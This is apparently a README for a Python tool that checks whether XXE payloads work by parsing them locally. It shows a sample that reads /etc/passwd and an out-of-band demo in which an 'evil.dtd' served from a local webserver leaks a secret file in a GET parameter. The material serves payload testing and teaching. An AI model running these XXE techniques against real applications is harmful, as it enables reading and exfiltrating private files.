xxetester
================

According to OWASP Top 10 of 2010, XXE vulnerabilities are one of the most common vulnerabilities in web applications. It is common to test an application for an XXE vulnerability without getting any feedback whether the exploit is successful. Especially with Blind XXEs it cannot be determined with certainty. The question then arises: Is my payload corrupt or the parser of the application actually secure? 

Since there are a lot of XXE articles and payloads on the internet and not every payload really leads to success, a tool had to be developed to test the validity of an XXE exploit.

**The script parses the XML files on your system. Please be aware of this. DOS attacks like the billion laughs exploit will affect your own system.**

How to use
-------------------------------
The script uses the`lxml`. During development and testing various XML parser libraries were evaluated. Among others `pulldom` also stood out as an interesting choice, because external general entities can be processed optionally. Unfortunately, `pulldom` had difficulties with out-of-band payloads, therefore we switched to `lxml`. To install it you can execute the following command on your shell.

```
# pip3 install lxml
```

To test a payload the following command can be executed.

```
# python3 xxetester.py samples/catalog.xml 
<CATALOG>
<CD>
[...]
<TITLE>Unchain my heart</TITLE>
<ARTIST>Joe Cocker</ARTIST>
<COUNTRY>USA</COUNTRY>
<COMPANY>EMI</COMPANY>
<PRICE>8.20</PRICE>
<YEAR>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</YEAR>
</CD>
</CATALOG>
```
The `samples/catalog.xml` file contains a external entity reference to the local `/etc/passwd` file. We can see the included `passwd` file in the command line output. The file is included by the by parsing and processing the XML.

## Out-of-band XXE
Blind XXEs in particular are based on the fact that the application does not give the user any output at all. As an attacker you can only see if the application connects to your server. The `samples` folder contains an out-of-bands payload to read files from a system for testing purposes. The idea is that the processed XML contains a external entity reference to a DTD file which is stored on a webserver of the attacker. While parsing the user supplied XML the parser resolves also the external entities of the DTD. This in turn can give an attacker the possibility to send file content of a local stored file via GET request argument to the attacker.


We simply execute the following commands to move the `secret` file into the `/tmp/` directory. This file represents the file that an attacker tries to access with the XXE. **Note that with the following payload we can only read files with a single line. The `secret` file contains only one line.** Then we change the directory to `samples`. In this directory is the `evil.dtd` file. This file will be loaded by the `oobxxe.xml` later on. Then we start a webserver on port 8090. 
```
# mv samples/secret /tmp/secret
# cd samples
# python3 -m http.server 8090
```
In a new terminal we execute the following command. 
```
# python3 xxetester.py samples/oobxxe.xml
StartTag: invalid element name, line 1, column 2 (127.0.0.1:8090?collect=1337SECRET1337, line 1)
If you wish more info execute this script with --verbose flag
```
With this command we can test the payload in `oobxxe.xml` which reads the `evil.dtd`. This .dtd file specifies the file that should be read and sent as an argument in a GET request. In our case `/tmp/secret` will be read and sent to our webserver.

Altough the script exits with an exception we see the following output on our webserver.
```
127.0.0.1 - - [05/Sep/2020 21:21:27] "GET /evil.dtd HTTP/1.0" 200 -
127.0.0.1 - - [05/Sep/2020 21:21:27] "GET /?collect=1337SECRET1337 HTTP/1.0" 200 -
```
With the first request the `evil.dtd` file is accessed. In the second GET request, the collect argument contains the contents of the `/tmp/secret` file.
